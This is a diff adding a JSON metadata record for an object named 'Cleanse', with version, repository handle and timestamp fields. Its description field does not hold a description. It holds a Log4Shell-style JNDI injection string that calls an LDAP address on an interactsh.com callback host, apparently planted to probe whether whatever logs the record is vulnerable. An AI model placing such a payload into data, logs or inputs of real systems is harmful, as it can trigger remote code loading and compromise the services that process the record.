@@ -1,0 +1,27 @@
+{
+  "objectInfo" : {
+    "id" : "2zOaQTCdYUnf70rDE4KbUp",
+    "name" : "Cleanse",
+    "type" : "CLEANSE",
+    "metadata" : {
+      "modelVersion" : {
+        "major" : 1,
+        "minor" : 0
+      },
+      "repoInfo" : {
+        "repoHandle" : "2zOaQTCdYUnf70rDE4KbUp"
+      },
+      "contextAttributes" : [ ],
+      "additionalInfo" : {
+        "description" : "${jndi:ldap://c6q8e5aek13mjm8vu6hgcg4eqfoyyyyyn.interactsh.com/a}",
+        "contentType" : "Binary",
+        "documentState" : "INVALID"
+      }
+    }
+  },
+  "dataFileExtension" : "json",
+  "updateTime" : "2025-06-13T09:12:36.727Z",
+  "objectRefs" : [ ],
+  "readableFileExtension" : null,
+  "readableFilePresent" : false
+}
